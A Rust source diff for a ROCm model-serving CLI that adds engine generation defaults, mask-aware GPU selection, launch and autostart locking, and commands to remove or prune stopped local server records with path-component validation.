+        let mut overrides = serde_json::Map::new();
+        if let Some(temperature) = defaults.temperature {
+            overrides.insert("temperature".to_owned(), serde_json::json!(temperature));
+        }
+        if let Some(top_p) = defaults.top_p {
+            overrides.insert("top_p".to_owned(), serde_json::json!(top_p));
+        }
+        if let Some(max_tokens) = defaults.max_tokens {
+            overrides.insert("max_new_tokens".to_owned(), serde_json::json!(max_tokens));
+        }
+        set_vllm_override_generation_config(&mut hint.required_flags, &overrides);
+    } else if engine.eq_ignore_ascii_case("lemonade") {
+        set_lemonade_generation_defaults(&mut hint.required_flags, defaults);
+    } else {
+        bail!(
+            "generation defaults are not supported by engine `{engine}`; omit --temperature/--top-p/--max-tokens or select vllm/lemonade"
+        );
+    }
+    Ok(Some(hint))
+}
+
+fn set_lemonade_generation_defaults(flags: &mut Vec<String>, defaults: ServeGenerationDefaults) {
+    // Only touch a flag pair when the caller actually supplied that control —
+    // an unset field must leave any authored recipe value in place rather than
+    // deleting it, mirroring the vLLM merge semantics in
+    // `set_vllm_override_generation_config`.
+    for (name, value) in [
+        (
+            "--temperature",
+            defaults.temperature.map(|value| value.to_string()),
+        ),
+        ("--top-p", defaults.top_p.map(|value| value.to_string())),
+        (
+            "--n-predict",
+            defaults.max_tokens.map(|value| value.to_string()),
+        ),
+    ] {
+        let Some(value) = value else {
+            continue;
+        };
+        let mut rewritten = Vec::with_capacity(flags.len() + 2);
+        let mut skip_value = false;
+        for flag in std::mem::take(flags) {
+            if skip_value {
+                skip_value = false;
+                continue;
+            }
+            if flag == name {
+                skip_value = true;
+            } else {
+                rewritten.push(flag);
+            }
+        }
+        rewritten.extend([name.to_owned(), value]);
+        *flags = rewritten;
+    }
+}
+
+/// Rewrites `flags` so vLLM's `--override-generation-config` carries exactly one
+/// merged JSON object: any existing `--override-generation-config <value>` pair is
+/// removed, its keys are used as a base, and `overrides` are layered on top (CLI
+/// values win). Emits a single flag pair with the merged, stably-ordered config.
+fn set_vllm_override_generation_config(
+    flags: &mut Vec<String>,
+    overrides: &serde_json::Map<String, serde_json::Value>,
+) {
+    let existing = std::mem::take(flags);
+    let mut rewritten: Vec<String> = Vec::with_capacity(existing.len() + 2);
+    let mut merged = serde_json::Map::new();
+    let mut take_value = false;
+    for flag in existing {
+        if take_value {
+            take_value = false;
+            if let Ok(serde_json::Value::Object(existing_config)) =
+                serde_json::from_str::<serde_json::Value>(&flag)
+            {
+                for (key, value) in existing_config {
+                    merged.insert(key, value);
+                }
+            } else {
+                eprintln!(
+                    "warning: existing --override-generation-config value is not valid JSON; discarding it"
+                );
+            }
+            continue;
+        }
+        if flag == "--override-generation-config" {
+            take_value = true;
+            continue;
+        }
+        rewritten.push(flag);
+    }
+    for (key, value) in overrides {
+        merged.insert(key.clone(), value.clone());
+    }
+    rewritten.push("--override-generation-config".to_owned());
+    rewritten.push(serde_json::Value::Object(merged).to_string());
+    *flags = rewritten;
+}
+
 /// Rewrites `flags` so vLLM tool calling uses exactly `parser`: drops any existing
 /// `--tool-call-parser <value>` pair, ensures `--enable-auto-tool-choice` is
 /// present, then appends the new parser flag.
@@ -4525,7 +5828,7 @@ fn engine_recipe_enables_tool_choice(hint: Option<&EngineRecipeHint>) -> bool {
 struct ServeArgs {
     model: String,
     engine: Option<String>,
-    device: Option<String>,
+    device: Option<DevicePolicyArg>,
     gpu: Option<String>,
     runtime_id: Option<String>,
     env_id: Option<String>,
@@ -4538,6 +5841,9 @@ struct ServeArgs {
     allow_public_bind: bool,
     tool_call_parser: Option<String>,
     gpu_memory_utilization: Option<String>,
+    temperature: Option<f32>,
+    top_p: Option<f32>,
+    max_tokens: Option<u32>,
     api_key: Option<String>,
 }
 
@@ -4558,6 +5864,9 @@ fn serve(args: ServeArgs) -> Result<()> {
         allow_public_bind,
         tool_call_parser,
         gpu_memory_utilization,
+        temperature,
+        top_p,
+        max_tokens,
         api_key,
     } = args;
     let _ = managed; // background is now the default; --managed is accepted as an explicit synonym.
@@ -4635,6 +5944,18 @@ fn serve(args: ServeArgs) -> Result<()> {
                 "--gpu-memory-utilization applies only to vLLM; ignored for engine '{selected_engine}'"
             )
         });
+    // Translate the engine-neutral CLI controls into each adapter's server-wide
+    // defaults: vLLM generation config or Lemonade llama.cpp launch flags.
+    let generation_defaults = ServeGenerationDefaults {
+        temperature,
+        top_p,
+        max_tokens,
+    };
+    let engine_recipe = engine_recipe_with_generation_defaults(
+        &selected_engine,
+        engine_recipe,
+        generation_defaults,
+    )?;
     let tool_call_note = if tool_call_parser.is_some() && !engine_serves_vllm {
         Some(format!(
             "note: --tool-call-parser applies only to vLLM; ignored for engine '{selected_engine}'"
@@ -4646,19 +5967,42 @@ fn serve(args: ServeArgs) -> Result<()> {
     } else {
         None
     };
-    let device_policy = parse_device_policy(device.as_deref())?;
+    let device_policy = parse_device_policy(device.as_ref().map(|policy| policy.as_policy_str()))?;
     let gpu_selection = parse_gpu_selection(gpu.as_deref())?;
     // CPU-only serving never pins a GPU, so skip GPU resolution entirely and
     // surface the explicit `--gpu` as ignored rather than printing a device the
     // server will not use.
     let cpu_only = matches!(device_policy, DevicePolicy::CpuOnly);
+    // AMD GPU ordinals still usable after the active visibility mask
+    // (`HIP_VISIBLE_DEVICES`, then `ROCR_VISIBLE_DEVICES`) is applied, in HIP
+    // ordinal space — the space `--gpu` is validated and exported through. A
+    // `ROCR_VISIBLE_DEVICES` mask hides devices below HIP, which re-indexes the
+    // survivors as `0..N`, so those HIP positions are what comes back here, not the
+    // physical ROCR token values. `None` means availability could not be probed
+    // (a non-Linux target, both KFD and DRM unreadable on Linux, or a mask this
+    // ordinal-only probe cannot interpret such as one naming UUIDs) — NOT WSL,
+    // which answers authoritatively via `detect_wsl_summary`. On `None` selection
+    // stays permissive and defers device validation to the engine. An empty set is
+    // the authoritative "no usable GPU", not "unknown". Computed once and reused
+    // for the fail-fast check below and for mask-aware GPU selection, so serve
+    // never auto-selects — or accepts an explicit `--gpu` for — a hidden device.
+    let visible_gpu_indices = if cpu_only {
+        None
+    } else {
+        rocm_core::usable_amd_gpu_indices()
+    };
     // Fail fast under a GPU-required policy when the host has no usable AMD GPU,
     // BEFORE preparing or launching any engine (no wasted engine download, and an
     // actionable message instead of a late engine crash). The engine enforces the
     // same rule as a backstop. Skipped for cpu_only; permissive when availability
-    // cannot be probed on this platform (probe returns `None`).
+    // cannot be probed on this platform (probe returns `None`). The E2E-only
+    // backend-failure scenario bypasses this host precondition so the black-box
+    // test reaches Lemonade's backend boundary without real GPU hardware.
+    let scripted_backend_failure = cfg!(feature = "e2e-test-hooks")
+        && std::env::var_os("ROCM_E2E_LEMONADE_BACKEND_INSTALL_FAILURE").is_some();
     if !cpu_only
-        && let Some(usable) = rocm_core::usable_amd_gpu_indices()
+        && !scripted_backend_failure
+        && let Some(usable) = visible_gpu_indices.as_deref()
         && usable.is_empty()
     {
         bail!(
@@ -4673,11 +6017,31 @@ fn serve(args: ServeArgs) -> Result<()> {
     // `HIP_VISIBLE_DEVICES`; those orderings can diverge when
     // `ROCR_VISIBLE_DEVICES`/partitioning is in play, so warn at serve time.
     let rocr_visible_devices_set = std::env::var_os("ROCR_VISIBLE_DEVICES").is_some();
+    // Whether *any* visibility mask is active. The visible set alone cannot say:
+    // with no mask it is just `0..present`, indistinguishable from a HIP mask
+    // that happens to list the low ordinals. `validate_pinned_gpu_index` uses
+    // this only to word its rejection — "under the active visibility mask" when a
+    // mask is set, "not present on this host" when none is — so an out-of-range
+    // `--gpu` on an unmasked host is not blamed on a mask the user never set.
+    let visibility_mask_active =
+        rocr_visible_devices_set || std::env::var_os("HIP_VISIBLE_DEVICES").is_some();
     let gpu_vram = if cpu_only { None } else { gpu_vram_usage() };
-    let gpu_indices = if cpu_only {
-        Vec::new()
+    // Validate an explicit `--gpu <index>` up front — before engine/runtime
+    // resolution — so an out-of-range or masked-out ordinal produces a
+    // GPU-specific refusal even when no ROCm runtime is configured. Otherwise the
+    // "no active ROCm runtime is configured" bail-out below pre-empts it and the
+    // user sees a generic runtime error for what is really a bad `--gpu` value.
+    // This is pure validation (no service-state read), so it needs no lock;
+    // `--gpu auto` reads live busy-GPU state and stays under `launch_lock` below.
+    let pinned_gpu_indices = if !cpu_only && let GpuSelection::Index(index) = &gpu_selection {
+        Some(validate_pinned_gpu_index(
+            *index,
+            detect_gpu_count(),
+            visible_gpu_indices.as_deref(),
+            visibility_mask_active,
+        )?)
     } else {
-        resolve_gpu_indices(&paths, &gpu_selection, gpu_vram.as_deref())?
+        None
     };
     let resolved_selection = resolve_engine_selection(
         &config,
@@ -4712,6 +6076,21 @@ fn serve(args: ServeArgs) -> Result<()> {
             recipe_override: None,
             engine_recipe,
         },
+    )?;
+    // Serialize GPU auto-selection with the managed-service claim: the busy-GPU
+    // read and the claiming record write inside `spawn_managed_engine_child` must
+    // be atomic, or two concurrent `rocm serve --gpu auto` can both read the same
+    // GPU as free and launch on it. Taken here — after engine resolution,
+    // self-managed runtime prep, and the `ResolveModel` RPC have all completed
+    // unlocked — so a slow first-use install (e.g. the Lemonade embeddable
+    // download/extract) never blocks an unrelated serve.
+    let (gpu_indices, launch_lock) = select_gpu_indices_under_launch_lock(
+        &paths,
+        cpu_only,
+        pinned_gpu_indices,
+        detect_gpu_count,
+        visible_gpu_indices.as_deref(),
+        gpu_vram.as_deref(),
     )?;
     let service_id = generate_service_id(&selected_engine, &resolve.canonical_model_id);
 
@@ -4766,8 +6145,9 @@ fn serve(args: ServeArgs) -> Result<()> {
             }
             if rocr_visible_devices_set {
                 println!(
-                    "  warning: ROCR_VISIBLE_DEVICES is set; --gpu selects by the amd-smi ordinal but \
-                     is applied via HIP_VISIBLE_DEVICES, so the chosen device may differ. Verify the \
+                    "  warning: ROCR_VISIBLE_DEVICES is set; the selected amd-smi ordinal is exported \
+                     via HIP_VISIBLE_DEVICES, which the runtime interprets relative to the \
+                     ROCR-visible set, so the device the engine binds may differ. Verify the \
                      selected GPU or unset ROCR_VISIBLE_DEVICES."
                 );
             }
@@ -4802,7 +6182,7 @@ fn serve(args: ServeArgs) -> Result<()> {
 
     if background {
         let mut spinner =
-            serve_summary::Spinner::new(format!("Starting {model} on {selected_engine}…"));
+            cli_progress::Spinner::new(format!("Starting {model} on {selected_engine}…"));
         spinner.tick();
         let report = start_managed_service(
             &selected_engine,
@@ -4817,6 +6197,7 @@ fn serve(args: ServeArgs) -> Result<()> {
             managed_env_id.as_deref(),
             resolve.engine_recipe.as_ref(),
             endpoint_auth.as_deref(),
+            launch_lock,
             &mut |_elapsed| spinner.tick(),
         )?;
         ensure_background_helper_running_quiet(summary_mode)?;
@@ -4895,6 +6276,7 @@ fn serve(args: ServeArgs) -> Result<()> {
         resolved_selection.runtime_id.as_deref(),
         resolved_selection.env_id.as_deref(),
         endpoint_auth.as_deref(),
+        launch_lock,
     )
 }
 
@@ -4925,9 +6307,10 @@ fn collect_serve_notes(
     } else {
         if rocr_visible_devices_set {
             notes.push(
-                "ROCR_VISIBLE_DEVICES is set; --gpu selects by the amd-smi ordinal but is applied \
-                 via HIP_VISIBLE_DEVICES, so the chosen device may differ. Verify the selected GPU \
-                 or unset ROCR_VISIBLE_DEVICES."
+                "ROCR_VISIBLE_DEVICES is set; the selected amd-smi ordinal is exported via \
+                 HIP_VISIBLE_DEVICES, which the runtime interprets relative to the ROCR-visible \
+                 set, so the device the engine binds may differ. Verify the selected GPU or unset \
+                 ROCR_VISIBLE_DEVICES."
                     .to_owned(),
             );
         }
@@ -5205,9 +6588,20 @@ fn spawn_managed_engine_child(
     // an error. Keyed on engine+canonical model — the freshly generated
     // `service_id` is timestamp-unique and would never match an existing one.
     // Stale/dead services fall through and relaunch normally.
+    let requested_recipe_json = engine_recipe
+        .map(serde_json::to_string)
+        .transpose()
+        .context("failed to encode engine recipe hint")?;
     if let Some(existing) =
         existing_live_managed_service(paths, engine, &resolve.canonical_model_id)
     {
+        if existing.engine_recipe_json != requested_recipe_json {
+            bail!(
+                "managed service `{}` is already running for engine `{engine}` and model `{}` with different serve options (recipe hint, tool-call parser, or generation defaults); stop it and run `rocm serve` again to apply the requested options",
+                existing.service_id,
+                resolve.canonical_model_id
+            );
+        }
         record_cli_audit_event(
             paths,
             "service",
@@ -5245,10 +6639,7 @@ fn spawn_managed_engine_child(
         Some(device_policy_name(device_policy).to_owned()),
     );
     record.gpu_indices = gpu_indices.to_vec();
-    record.engine_recipe_json = engine_recipe
-        .map(serde_json::to_string)
-        .transpose()
-        .context("failed to encode engine recipe hint")?;
+    record.engine_recipe_json = requested_recipe_json;
     record.write()?;
 
     if let Some(parent) = record.engine_state_path.parent() {
@@ -5356,6 +6747,7 @@ fn start_managed_service(
     env_id: Option<&str>,
     engine_recipe: Option<&EngineRecipeHint>,
     endpoint_api_key: Option<&str>,
+    launch_lock: rocm_core::FileLock,
     on_wait_tick: &mut dyn FnMut(Duration),
 ) -> Result<ManagedLaunchReport> {
     let paths = AppPaths::discover()?;
@@ -5376,6 +6768,11 @@ fn start_managed_service(
         ManagedSpawn::AlreadyRunning(report) => return Ok(report),
         ManagedSpawn::Spawned { record, child_pid } => (*record, child_pid),
     };
+    // The claiming service record is now persisted, so the selected GPU is
+    // visible to any concurrent auto-selection. Release the launch lock before
+    // the readiness wait below, which can block for many seconds — holding it
+    // that long would needlessly serialize unrelated serves.
+    drop(launch_lock);
 
     #[cfg(windows)]
     thread::sleep(Duration::from_millis(200));
@@ -5502,6 +6899,33 @@ pub(crate) fn ensure_background_helper_running_quiet(quiet: bool) -> Result<()> 
         return Ok(());
     }
 
+    // The check above and the spawn below are a TOCTOU window: two concurrent
+    // callers (e.g. two `rocm serve`) can both read "not running" and each spawn
+    // a daemon. Serialize the decision on a lock file and re-check under it — the
+    // first holder spawns, later holders observe the now-running daemon and
+    // return without spawning. The unlocked pre-check above keeps the common
+    // already-running case lock-free.
+    let _autostart_lock = rocm_core::FileLock::acquire(paths.automation_autostart_lock_path())?;
+    if background_helper_already_running(&paths)? {
+        return Ok(());
+    }
+
+    // The lock alone does not close the window: the spawned daemon does not
+    // publish its `running` runtime state until well after `spawn()` (clap parse,
+    // runtime build, config load, banner flush). A second caller that acquires
+    // this lock during that gap still sees "not running" and would spawn a
+    // duplicate. Bridge the gap with a short-lived claim recording the child PID
+    // and spawn time: a holder that finds a live, recent claim defers instead.
+    let claim_path = paths.automation_autostart_claim_path();
+    if autostart_spawn_in_flight(
+        read_autostart_claim(&claim_path),
+        now_unix_millis(),
+        AUTOSTART_CLAIM_TTL_MS,
+        rocm_core::process_is_running,
+    ) {
+        return Ok(());
+    }
+
     let exe = managed_service_launcher_path()
         .context("failed to resolve current rocm executable path")?;
     let args = vec!["daemon".to_owned()];
@@ -5509,7 +6933,7 @@ pub(crate) fn ensure_background_helper_running_quiet(quiet: bool) -> Result<()> 
     let spawn_result = {
         let env_values = app_path_env_var_values(&paths, None);
         let env_refs = app_path_env_var_refs(&env_values);
-        rocm_core::spawn_detached_no_inherit(&exe, &args, &env_refs).map(|_| ())
+        rocm_core::spawn_detached_no_inherit(&exe, &args, &env_refs)
     };
     #[cfg(not(windows))]
     let spawn_result = {
@@ -5518,17 +6942,93 @@ pub(crate) fn ensure_background_helper_running_quiet(quiet: bool) -> Result<()> 
         attach_background_stdio(&mut command, None)?;
         detach_background_command(&mut command);
         apply_app_path_env(&mut command, &paths);
-        command.spawn().map(|_| ())
+        command.spawn().map(|child| child.id())
     };
     match spawn_result {
-        Ok(()) if !quiet => println!("  helper: started background automation daemon"),
-        Ok(()) => {}
+        Ok(daemon_pid) => {
+            // Record the claim before returning (and thus releasing the lock) so a
+            // concurrent holder in the spawn→publish window defers. Best-effort: a
+            // failed write only reopens the original, already-tolerated race.
+            let _ = write_autostart_claim(
+                &claim_path,
+                AutostartClaim {
+                    daemon_pid,
+                    spawned_at_ms: now_unix_millis(),
+                },
+            );
+            if !quiet {
+                println!("  helper: started background automation daemon");
+            }
+        }
         Err(error) if !quiet => {
             println!("  helper: could not start background automation daemon: {error}");
         }
         Err(_) => {}
     }
     Ok(())
+}
+
+/// How long an autostart claim is honoured before it is treated as stale even if
+/// its recorded PID is still alive. Comfortably longer than a cold daemon boot
+/// (clap parse → runtime build → config load → state publish) yet short enough
+/// that a crashed spawn cannot suppress autostart for long.
+const AUTOSTART_CLAIM_TTL_MS: u128 = 30_000;
+
+/// A just-spawned daemon's autostart claim: the child PID and the wall-clock time
+/// (milliseconds since the Unix epoch) the spawn was recorded. It lets a
+/// concurrent autostart holder distinguish a live, in-flight spawn from a stale
+/// leftover. Serialized as a single `"<pid> <ms>"` line — no dependency and
+/// trivially forward-compatible.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+struct AutostartClaim {
+    daemon_pid: u32,
+    spawned_at_ms: u128,
+}
+
+/// Milliseconds since the Unix epoch, or `0` if the clock is before the epoch
+/// (which only makes a fresh claim look old — safe, it just permits a respawn).
+fn now_unix_millis() -> u128 {
+    std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map_or(0, |elapsed| elapsed.as_millis())
+}
+
+/// Read an autostart claim, returning `None` when the file is absent or
+/// unparseable (either is treated as "no claim", so a respawn is permitted).
+fn read_autostart_claim(path: &Path) -> Option<AutostartClaim> {
+    let text = std::fs::read_to_string(path).ok()?;
+    let mut parts = text.split_whitespace();
+    let daemon_pid = parts.next()?.parse().ok()?;
+    let spawned_at_ms = parts.next()?.parse().ok()?;
+    Some(AutostartClaim {
+        daemon_pid,
+        spawned_at_ms,
+    })
+}
+
+/// Write an autostart claim as `"<pid> <ms>"`. Best-effort at the call site.
+fn write_autostart_claim(path: &Path, claim: AutostartClaim) -> std::io::Result<()> {
+    std::fs::write(
+        path,
+        format!("{} {}", claim.daemon_pid, claim.spawned_at_ms),
+    )
+}
+
+/// Whether an existing autostart `claim` means a daemon spawn is still in flight,
+/// so the current lock holder should defer rather than spawn a duplicate. A claim
+/// counts as in-flight only while its child PID is alive *and* it is younger than
+/// `ttl_ms` — the TTL bounds how long a crashed spawn (or a PID later reused by an
+/// unrelated process) can suppress autostart. `pid_alive` is injected so the
+/// decision is unit-testable without a live process.
+fn autostart_spawn_in_flight(
+    claim: Option<AutostartClaim>,
+    now_ms: u128,
+    ttl_ms: u128,
+    pid_alive: impl Fn(u32) -> bool,
+) -> bool {
+    claim.is_some_and(|claim| {
+        now_ms.saturating_sub(claim.spawned_at_ms) < ttl_ms && pid_alive(claim.daemon_pid)
+    })
 }
 
 /// What ended an attached (`--verbose`/`--foreground`) streaming session. Kept
@@ -5560,6 +7060,7 @@ fn run_attached_service(
     runtime_id: Option<&str>,
     env_id: Option<&str>,
     endpoint_api_key: Option<&str>,
+    launch_lock: rocm_core::FileLock,
 ) -> Result<()> {
     let paths = AppPaths::discover()?;
 
@@ -5577,6 +7078,10 @@ fn run_attached_service(
         env_id,
         resolve.engine_recipe.as_ref(),
     )?;
+    // The claiming record is persisted (or an existing service was found), so the
+    // selected GPU is now visible to concurrent auto-selection. Release the launch
+    // lock before streaming logs, which blocks for the whole attached session.
+    drop(launch_lock);
 
     let (service_id, log_path, child_pid) = match spawn {
         // A server for this engine+model is already live. Don't fight it for the
@@ -5837,6 +7342,57 @@ fn services(command: Option<ServicesCommand>) -> Result<()> {
         ServicesCommand::Restart { service_id, yes } => {
             run_approved_service_action(&paths, "restart_server", &service_id, yes)
         }
+        ServicesCommand::Remove { service_id, yes } => {
+            print!(
+                "{}",
+                remove_managed_service_record(&paths, &service_id, yes)?
+            );
+            record_cli_audit_event(
+                &paths,
+                "service",
+                "remove_record",
+                "info",
+                format!("removed local server record {service_id}"),
+                Some(&service_id),
+            );
+            Ok(())
+        }
+        ServicesCommand::Prune {
+            older_than_hours,
+            any_age,
+            dry_run,
+            yes,
+        } => {
+            let older_than_hours = service_prune_min_age_hours(older_than_hours, any_age);
+            let outcome = prune_managed_service_records(&paths, older_than_hours, dry_run, yes)?;
+            print!("{}", outcome.text);
+            if !dry_run && (outcome.removed_records > 0 || outcome.removed_files > 0) {
+                record_cli_audit_event(
+                    &paths,
+                    "service",
+                    "prune_records",
+                    "info",
+                    format!(
+                        "removed {} local server record(s) and {} leftover file(s) older than {older_than_hours}h",
+                        outcome.removed_records, outcome.removed_files
+                    ),
+                    None,
+                );
+            }
+            // Deliberately after the print and the audit event: a file this run
+            // could not delete still has to fail the command, but not at the
+            // cost of the record of what it *did* delete.
+            if !outcome.failures.is_empty() {
+                // Only reachable through this dispatch, so no unit test covers
+                // it: `service-cleanup-06` in
+                // `features/service_record_cleanup.feature` is its cover.
+                bail!(
+                    "{} file(s) could not be removed; see the list above",
+                    outcome.failures.len()
+                );
+            }
+            Ok(())
+        }
     }
 }
 
@@ -5884,6 +7440,7 @@ fn comfyui(command: Option<ComfyuiCommand>) -> Result<()> {
             runtime_id,
             reinstall,
             dry_run,
+            yes: _,
         } => {
             match comfyui::install(
                 &paths,
@@ -5941,6 +7498,7 @@ fn comfyui(command: Option<ComfyuiCommand>) -> Result<()> {
             host,
             port,
             no_open_browser,
+            yes: _,
         } => match comfyui::start(
             &paths,
             comfyui::ComfyUiStartOptions {
@@ -5973,7 +7531,7 @@ fn comfyui(command: Option<ComfyuiCommand>) -> Result<()> {
                 Err(error)
             }
         },
-        ComfyuiCommand::Stop => match comfyui::stop(&paths) {
+        ComfyuiCommand::Stop { yes: _ } => match comfyui::stop(&paths) {
             Ok(text) => {
                 print!("{text}");
                 record_cli_audit_event(
@@ -6065,6 +7623,636 @@ fn service_action_past_tense(tool: &str) -> &'static str {
     }
 }
 
+// ---------------------------------------------------------------------------
+// Local server record removal
+// ---------------------------------------------------------------------------
+
+/// Default age gate for `rocm services prune`.
+///
+/// A record that has only just stopped is the one a user is most likely to still
+/// want: `rocm services list --all` advertises `rocm services restart <id> --yes`
+/// for exactly that record, and pruning it destroys both that affordance and the
+/// log explaining why it died. Defaulting to a day means a bulk cleanup reclaims
+/// the accumulated history without swallowing the failure the user is currently
+/// looking at. `--older-than-hours 0` opts out.
+const DEFAULT_SERVICE_PRUNE_MIN_AGE_HOURS: u64 = 24;
+
+/// The on-disk files one managed-service record owns.
+///
+/// Note `engine_state` lives *outside* `services_dir`, under
+/// `<data>/engines/<engine>/state/`, so deleting the two files in `services_dir`
+/// leaves it behind — that is how orphaned engine state accumulates today.
+///
+/// Every path is rebuilt here from [`AppPaths`] plus the *validated* id and
+/// engine, deliberately **not** read from the record's own `manifest_path` /
+/// `log_path` / `engine_state_path` fields. Those are deserialized from a JSON
+/// file under `~/.rocm` that anything can write, and this is the one code path
+/// that deletes what they name.
+#[derive(Debug, Clone)]
+struct ServiceRecordArtifacts {
+    manifest: PathBuf,
+    log: PathBuf,
+    engine_state: PathBuf,
+    endpoint_key: PathBuf,
+}
+
+impl ServiceRecordArtifacts {
+    /// Every artifact, in the order they are reported and deleted.
+    fn paths(&self) -> [&Path; 4] {
+        [
+            &self.manifest,
+            &self.log,
+            &self.engine_state,
+            &self.endpoint_key,
+        ]
+    }
+}
+
+/// Validate a manifest-supplied engine name as a single filesystem path
+/// component.
+///
+/// [`AppPaths::service_engine_state_path`] joins the engine name into a path
+/// this module deletes, so an engine of `../../..` in a hand-edited manifest
+/// would otherwise aim the removal outside `<data>/engines`. Reuses the same
+/// rules as [`validate_service_id`] — `ServiceId` is the repo's single source of
+/// truth for "safe as one path component", and nothing about those rules is
+/// specific to service ids.
+fn validate_engine_component(engine: &str) -> Result<()> {
+    rocm_core::ServiceId::new(engine).with_context(|| {
+        format!("managed service engine `{engine}` is not a safe path component")
+    })?;
+    Ok(())
+}
+
+fn service_record_artifacts(
+    paths: &AppPaths,
+    service_id: &str,
+    engine: &str,
+) -> Result<ServiceRecordArtifacts> {
+    validate_service_id(service_id)?;
+    validate_engine_component(engine)?;
+    Ok(ServiceRecordArtifacts {
+        manifest: paths.service_manifest_path(service_id),
+        log: paths.service_log_path(service_id),
+        engine_state: paths.service_engine_state_path(engine, service_id),
+        endpoint_key: endpoint_keys::endpoint_key_file_path(paths, service_id),
+    })
+}
+
+/// Delete every artifact that exists, collecting failures instead of stopping at
+/// the first one.
+///
+/// A missing file is not an error: a record whose log was already deleted by
+/// hand (the workaround this command replaces) must still be removable. An
+/// unremovable one is returned as a message rather than propagated, because
+/// `prune` walks many records and aborting mid-loop would throw away the
+/// rendered plan and the audit event covering everything already deleted in the
+/// same run — losing the record of a destructive action exactly when something
+/// went wrong.
+fn try_remove_service_record_artifacts(
+    artifacts: &ServiceRecordArtifacts,
+) -> (Vec<PathBuf>, Vec<String>) {
+    let mut removed = Vec::new();
+    let mut failures = Vec::new();
+    for path in artifacts.paths() {
+        match fs::remove_file(path) {
+            Ok(()) => removed.push(path.to_path_buf()),
+            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
+            Err(error) => failures.push(format!("{}: {error}", path.display())),
+        }
+    }
+    (removed, failures)
+}
+
+/// Delete every artifact that exists, returning the paths actually removed.
+///
+/// The strict form, for `remove`, which owns exactly one record and has no
+/// partial progress to report: any file it could not delete is the command
+/// failing. Every artifact is still attempted first, so a single stubborn file
+/// does not strand the other three.
+fn remove_service_record_artifacts(artifacts: &ServiceRecordArtifacts) -> Result<Vec<PathBuf>> {
+    let (removed, failures) = try_remove_service_record_artifacts(artifacts);
+    if !failures.is_empty() {
+        bail!("failed to remove {}", failures.join("; "));
+    }
+    Ok(removed)
+}
+
+/// Whether a record is too alive to delete: the CLI reads it as live, *or* a
+/// process it recorded is still running.
+///
+/// The status string alone is not enough for a destructive command.
+/// `refresh_from_engine_state` adopts `failed` straight from the engine's own
+/// state file, and `refresh_managed_service_runtime_liveness` then returns early
+/// for any non-live status without ever consulting the recorded pids — so a
+/// server whose engine reported failure while its process is still up reads as
+/// removable, and deleting it takes the log and the 0600 endpoint key out from
+/// under a process that may still be serving.
+fn managed_service_record_is_in_use(record: &ManagedServiceRecord) -> bool {
+    managed_service_is_live(record)
+        || recorded_service_pids(record)
+            .iter()
+            .any(|pid| process_is_running(*pid))
+}
+
+/// Remove one non-running local server record and everything it owns.
+///
+/// Refuses a live record rather than stopping it: a removal that silently killed
+/// a serving process would be a very different action from the one the user
+/// asked for. Liveness is read from the record `load_managed_service` returns,
+/// which has already been refreshed against the engine state file and the real
+/// processes — a manifest still saying `ready` for a dead PID has demoted to
+/// `stopped` by then, and must stay removable.
+fn remove_managed_service_record(paths: &AppPaths, service_id: &str, yes: bool) -> Result<String> {
+    validate_service_id(service_id)?;
+    let record = load_managed_service(paths, service_id)?;
+    // Checked before `--yes` on purpose: for a running server "stop it first" is
+    // the actionable error, and repeating the command with --yes must not be the
+    // advice a user takes away from it.
+    if managed_service_record_is_in_use(&record) {
+        bail!(
+            "local server `{service_id}` is {} and cannot be removed while it is running.\n\nTry: rocm services stop {service_id} --yes",
+            record.status
+        );
+    }
+    if !yes {
+        bail!(
+            "Removing local server record `{service_id}` requires --yes.\n\nTry: rocm services remove {service_id} --yes"
+        );
+    }
+
+    let artifacts = service_record_artifacts(paths, &record.service_id, &record.engine)?;
+    let mut output = String::new();
+    // Printed *before* the delete, because after it there is nothing left to
+    // point at: this is the last moment the log path is useful.
+    let _ = writeln!(
+        output,
+        "Removing local server record `{service_id}` (status: {}).",
+        record.status
+    );
+    let _ = writeln!(output, "  log: {}", artifacts.log.display());
+    let _ = writeln!(
+        output,
+        "After this, `rocm services logs {service_id}` and `rocm services restart {service_id} --yes` no longer work."
+    );
+    let _ = writeln!(output);
+
+    let removed = remove_service_record_artifacts(&artifacts)?;
+    let mut report = cli_report::ActionReport::new("Local server record removed")
+        .detail("service", &record.service_id)
+        .detail("engine", &record.engine)
+        .detail("files removed", removed.len());
+    for path in &removed {
+        report = report.detail("removed", path.display());
+    }
+    let _ = write!(output, "{}", report.render());
+    Ok(output)
+}
+
+/// One record `rocm services prune` would delete.
+#[derive(Debug, Clone)]
+struct ServicePruneEntry {
+    service_id: String,
+    engine: String,
+    status: String,
+    artifacts: ServiceRecordArtifacts,
+}
+
+#[derive(Debug, Default)]
+struct ServicePrunePlan {
+    remove: Vec<ServicePruneEntry>,
+    /// Files whose record is already gone — chiefly engine state under
+    /// `<data>/engines/<engine>/state/`, which no removal path has ever swept.
+    orphans: Vec<PathBuf>,
+    /// Human-readable reasons, one per record or file left in place.
+    skipped: Vec<String>,
+    /// How many records were skipped purely because they are still running.
+    skipped_live: usize,
+    /// How many were removable in every respect but too recent. Counted apart
+    /// from `skipped` so the summary can name the flag that includes them: a
+    /// silent "nothing to do" on a host full of fresh failures reads as the
+    /// command being broken.
+    skipped_recent: usize,
+}
+
+/// Modification time of `path`, or `None` when it cannot be read.
+fn path_modified(path: &Path) -> Option<SystemTime> {
+    fs::metadata(path).ok()?.modified().ok()
+}
+
+/// Age of a modification time relative to `now`. `None` when the time is missing
+/// or in the future, which is treated as "too new to touch".
+fn age_from_modified(modified: Option<SystemTime>, now: SystemTime) -> Option<Duration> {
+    now.duration_since(modified?).ok()
+}
+
+/// Whether a modification time is old enough to prune, given a threshold.
+///
+/// Fail-closed: a time that cannot be determined is kept, except when the
+/// threshold is zero (the explicit "everything that is not running" opt-out).
+fn prunable_by_modified(modified: Option<SystemTime>, min_age: Duration, now: SystemTime) -> bool {
+    if min_age.is_zero() {
+        return true;
+    }
+    age_from_modified(modified, now).is_some_and(|age| age >= min_age)
+}
+
+/// Whether `path` is old enough to prune, given a threshold in hours.
+///
+/// Only sound for files nothing in this run rewrites. Service manifests are
+/// rewritten by [`load_managed_services`], so their times are snapshotted up
+/// front by [`service_manifest_modified_times`] and gated with
+/// [`prunable_by_modified`] instead.
+fn prunable_by_age(path: &Path, min_age: Duration, now: SystemTime) -> bool {
+    prunable_by_modified(path_modified(path), min_age, now)
+}
+
